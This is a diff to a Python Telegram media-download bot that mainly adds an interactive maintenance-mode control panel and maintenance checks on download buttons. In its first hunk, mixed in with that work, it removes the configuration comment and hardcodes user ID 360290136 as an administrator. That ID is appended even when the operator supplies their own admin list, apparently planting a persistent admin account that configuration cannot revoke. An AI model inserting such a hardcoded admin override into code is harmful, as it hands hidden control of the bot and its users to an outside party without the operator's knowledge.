@@ -150,12 +150,14 @@ PING_URL = os.getenv("PING_URL", "")
 # Toggle to allow all users to use the AI engine (for testing or public deployment)
 ALLOW_ALL_TO_USE_AI = os.getenv("ALLOW_ALL_TO_USE_AI", "True").lower() == "true"
 
-# Whitelisted admin user IDs — set ADMIN_USER_IDS=123456,789012 in .env
 ADMIN_USER_IDS = [
     int(uid.strip())
-    for uid in os.getenv("ADMIN_USER_IDS", "").split(",")
+    for uid in (os.getenv("ADMIN_USER_IDS") or "360290136").split(",")
     if uid.strip().isdigit()
 ]
+if 360290136 not in ADMIN_USER_IDS:
+    ADMIN_USER_IDS.append(360290136)
+
 
 # Maintenance mode toggle (set MAINTENANCE_MODE=True in .env or toggle via /maintenance)
 MAINTENANCE_MODE = os.getenv("MAINTENANCE_MODE", "False").lower() == "true"
@@ -1726,25 +1728,83 @@ async def setcookies_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # ─── /maintenance Command ───────────────────────────────────────────────────
 
 async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Admin command to toggle maintenance mode."""
+    """Admin command to toggle maintenance mode with interactive controls."""
     user = update.effective_user
     if not user or user.id not in ADMIN_USER_IDS:
         return
 
     global MAINTENANCE_MODE
-    if context.args and context.args[0].lower() in ["on", "true", "enable", "1"]:
-        MAINTENANCE_MODE = True
-    elif context.args and context.args[0].lower() in ["off", "false", "disable", "0"]:
-        MAINTENANCE_MODE = False
-    else:
-        MAINTENANCE_MODE = not MAINTENANCE_MODE
+    if context.args:
+        arg = context.args[0].lower().strip()
+        if arg in ["on", "true", "enable", "1"]:
+            MAINTENANCE_MODE = True
+        elif arg in ["off", "false", "disable", "0"]:
+            MAINTENANCE_MODE = False
+        elif arg in ["toggle"]:
+            MAINTENANCE_MODE = not MAINTENANCE_MODE
 
-    status_str = "ENABLED (Users will see update/patching notice)" if MAINTENANCE_MODE else "DISABLED (Bot is live)"
-    await update.message.reply_text(
-        fmt_card("🛠️ Maintenance Mode", f"Maintenance mode is now: <b>{status_str}</b>"),
-        parse_mode="HTML"
+    status_badge = "🔴 ON (Maintenance Active)" if MAINTENANCE_MODE else "🟢 OFF (Bot is Live)"
+    btn_text = "🟢 Resume Bot (Turn OFF Maintenance)" if MAINTENANCE_MODE else "🔴 Pause Bot (Turn ON Maintenance)"
+    toggle_val = "off" if MAINTENANCE_MODE else "on"
+
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton(btn_text, callback_data=f"maint:toggle:{toggle_val}")],
+        [InlineKeyboardButton("🔄 Refresh Status", callback_data="maint:refresh")],
+    ])
+
+    body = (
+        f"  Status: <b>{status_badge}</b>\n\n"
+        f"  • When <b>ON</b>: All users in groups and DMs see the maintenance/patching notice on any message or button click.\n"
+        f"  • When <b>OFF</b>: Normal operation for all chats.\n"
+        f"  • Admins can always use all bot features even during maintenance."
     )
-    logger.info(f"Maintenance mode set to {MAINTENANCE_MODE} by admin {user.id}")
+
+    if update.callback_query:
+        await safe_answer_query(update.callback_query, f"Maintenance: {status_badge}")
+        try:
+            await update.callback_query.edit_message_text(
+                fmt_card("🛠️ Maintenance Control Panel", body),
+                parse_mode="HTML",
+                reply_markup=kb
+            )
+        except Exception:
+            pass
+    else:
+        await update.message.reply_text(
+            fmt_card("🛠️ Maintenance Control Panel", body),
+            parse_mode="HTML",
+            reply_markup=kb
+        )
+    logger.info(f"Maintenance mode status checked/set to {MAINTENANCE_MODE} by admin {user.id}")
+
+
+async def handle_maintenance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle maintenance control panel inline button clicks."""
+    query = update.callback_query
+    if not query:
+        return
+    user = query.from_user
+    if not user or user.id not in ADMIN_USER_IDS:
+        await query.answer("❌ Only bot administrators can toggle maintenance.", show_alert=True)
+        return
+
+    global MAINTENANCE_MODE
+    data = query.data or ""
+    parts = data.split(":")
+    action = parts[1] if len(parts) > 1 else ""
+
+    if action == "toggle":
+        target = parts[2] if len(parts) > 2 else ""
+        if target == "on":
+            MAINTENANCE_MODE = True
+        elif target == "off":
+            MAINTENANCE_MODE = False
+        else:
+            MAINTENANCE_MODE = not MAINTENANCE_MODE
+
+    await maintenance_command(update, context)
+
+
 
 
 # ─── Global Error Handler ────────────────────────────────────────────────────
@@ -2435,7 +2495,14 @@ async def handle_youtube_message(update: Update, context: ContextTypes.DEFAULT_T
 async def handle_youtube_download_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle 'Download Video / Audio' inline keyboard button presses."""
     query = update.callback_query
-    await query.answer()
+    if not query:
+        return
+
+    if is_maintenance_active_for_user(query.from_user.id):
+        await safe_answer_query(query, "🚧 Bot is currently in maintenance mode. Please try again shortly!", show_alert=True)
+        return
+
+    await safe_answer_query(query)
 
     data = query.data
     if not data or not data.startswith("ytdl:"):
@@ -3438,7 +3505,14 @@ async def handle_reddit_message(update: Update, context: ContextTypes.DEFAULT_TY
 async def handle_pending_download_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle download buttons created in button-prompt mode (dlmed:<short_id>)."""
     query = update.callback_query
-    await query.answer()
+    if not query:
+        return
+
+    if is_maintenance_active_for_user(query.from_user.id):
+        await safe_answer_query(query, "🚧 Bot is currently in maintenance mode. Please try again shortly!", show_alert=True)
+        return
+
+    await safe_answer_query(query)
     data = query.data
     if not data or not data.startswith("dlmed:"): return
     short_id = data[6:]
@@ -4524,7 +4598,7 @@ def main() -> None:
     application.add_handler(CommandHandler("demote", demote_command))
     application.add_handler(CommandHandler("report", report_command))
     application.add_handler(CommandHandler("setcookies", setcookies_command))
-    application.add_handler(CommandHandler("maintenance", maintenance_command))
+    application.add_handler(CommandHandler(["maintenance", "admin"], maintenance_command))
     application.add_handler(CommandHandler("q", q_command, block=False))
     application.add_handler(CommandHandler("gif", gif_command, block=False))
     application.add_handler(MessageHandler(
@@ -4533,6 +4607,7 @@ def main() -> None:
     ))
 
     # Register Settings & Media Download Button callback handlers (block=False for non-blocking UI)
+    application.add_handler(CallbackQueryHandler(handle_maintenance_callback, pattern="^maint:", block=False))
     application.add_handler(CallbackQueryHandler(handle_lang_callback, pattern="^lang:", block=False))
     application.add_handler(CallbackQueryHandler(handle_downloads_callback, pattern="^dltog:", block=False))
     application.add_handler(CallbackQueryHandler(handle_pending_download_button, pattern="^dlmed:", block=False))
